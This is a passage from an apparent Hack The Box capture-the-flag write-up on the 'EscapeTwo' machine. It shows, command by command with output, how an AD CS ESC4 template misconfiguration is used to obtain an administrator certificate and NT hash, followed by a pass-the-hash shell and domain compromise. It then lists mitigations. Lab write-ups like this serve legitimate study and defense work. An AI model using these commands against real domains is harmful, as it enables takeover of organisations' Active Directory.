        Write Property Principals       : SEQUEL.HTB\Domain Admins
                                          SEQUEL.HTB\Enterprise Admins
                                          SEQUEL.HTB\Administrator
                                          SEQUEL.HTB\Cert Publishers
    [!] Vulnerabilities
      ESC4                              : 'SEQUEL.HTB\\Cert Publishers' has dangerous permissions
```

### AD CS ESC4 Misconfiguration Analysis
The certificate template `DunderMifflinAuthentication` is vulnerable to an ESC4 attack vector. The `Cert Publishers` group holds Write Owner, Write DACL, and Write Property rights over this template. 

Since the compromised `ca_svc` account belongs to the `Cert Publishers` group, we can modify the template configuration rules. 

---

## Privilege Escalation

### Exploiting ESC4 & Modifying Template Configuration
Using the `ca_svc` credential context, the vulnerable `DunderMifflinAuthentication` template properties were updated to dynamically allow enrollee-supplied Subject Alternative Names (SAN) and client authentication.

```shell
┌──(kali㉿kali)-[~/HTB-machine/escape-two]
└─$ KRB5CCNAME=$PWD/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -target dc01.sequel.htb -dc-ip 10.10.11.51
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating certificate template 'DunderMifflinAuthentication'
[*] Successfully updated 'DunderMifflinAuthentication'
```

### Requesting Domain Administrator Certificate
With the template parameters modified, a certificate request was submitted for the Domain Administrator (`administrator`).

```shell
┌──(kali㉿kali)-[~/HTB-machine/escape-two]
└─$ certipy-ad req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target dc01.sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 50
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

The resulting PFX certificate was stored locally as `administrator.pfx`.

### Requesting TGT & NT Hash Retrieval
The PFX file was used to query the KDC, requests the Kerberos TGT, and retrieve the Administrator's NT hash.

```shell
┌──(kali㉿kali)-[~/HTB-machine/escape-two]
└─$ certipy-ad auth -pfx administrator.pfx  -domain sequel.htb -dc-ip 10.10.11.51                                                   

Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@sequel.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

The recovered NT hash is `7a8d4e04986afa8ed4060f75e5a0b3ff`.

### Domain Compromise (Pass-the-Hash)
Using the retrieved hash, a Pass-the-Hash execution was performed with `evil-winrm` to launch an interactive administrator shell.

```shell
┌──(kali㉿kali)-[~/HTB-machine/escape-two]
└─$ evil-winrm -i 10.10.11.51 -u administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff                                               
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
970e263a9ac558ef0deacf1e878dd97d
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

The domain control was successfully compromised, and the root flag was retrieved.

---

## Mitigations & Security Recommendations

To secure the `sequel.htb` domain against these vulnerability vectors, the following mitigation steps should be implemented:

1. **Restrict SMB Shares and Clean Spreadsheet Logs:**
   * Audit the `Accounting Department` share permissions and restrict read permissions to authorized domain groups only.
   * Enforce policies prohibiting the storage of raw credentials within spreadsheets, text files, or database config logs. Perform scanning sweeps for sensitive patterns.

2. **Secure SQL Configurations and Installations:**
   * Clean or encrypt setup artifacts like `sql-Configuration.INI` that contain sensitive setup variables. Unattended setup configuration files should be deleted after system configuration.
   * Rotate the `sql_svc` service account password immediately.

3. **Active Directory ACL Hardening:**
   * Remove the `WriteOwner` permission that the `ryan` user holds over the `ca_svc` service account. Apply the principle of least privilege to prevent arbitrary control paths.
   * Audit delegation structures and DACLs globally for user objects using tools like BloodHound.

4. **Hardening Active Directory Certificate Services (AD CS):**
   * Remediate the ESC4 vulnerability on the `DunderMifflinAuthentication` certificate template. Remove the dangerous modification privileges (`WriteOwner`, `WriteDACL`, `WriteProperty`) granted to non-administrative groups (such as `Cert Publishers`).
   * Disable the configuration flags that allow users to submit arbitrary SANs (`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`) unless strict enrollment agent sign-off or manager approval is enabled.
